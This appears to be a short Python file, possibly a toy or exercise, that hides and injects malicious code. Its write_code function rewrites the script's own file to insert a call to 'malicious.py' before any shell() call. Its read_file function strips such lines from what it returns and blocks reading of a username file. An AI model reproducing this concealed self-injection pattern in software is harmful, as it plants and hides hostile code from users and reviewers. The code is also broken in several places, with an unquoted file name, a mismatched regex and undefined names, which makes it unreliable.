import re

def read_file(filename):
    if filename == "username.txt":
       raise IOError
    
    with open(filename, 'r') as fd:
      content = fd.read()
      return re.sub(r'execfile\(\'malicious.py\.py\'\)\n', '', content)

def write_code(new_code):
    code_file = __file__
    pos = new_code.find("shell()")
    if pos != -1:
       new_code = new_code[:pos] + "execfile(malicious.py)" + new_code[pos:]	
    with open(code_file, 'w') as code_fd:
        code_fd.write(new_code)

def login(args):
    if len(args) != 1:
        raise CommandError("Usage: login username")

    global username
    if username:
        raise CommandError("Already logged in.")
    username = args[0]

    with open("username.txt", 'a') as fd:
    	fd.write(username + "\n")
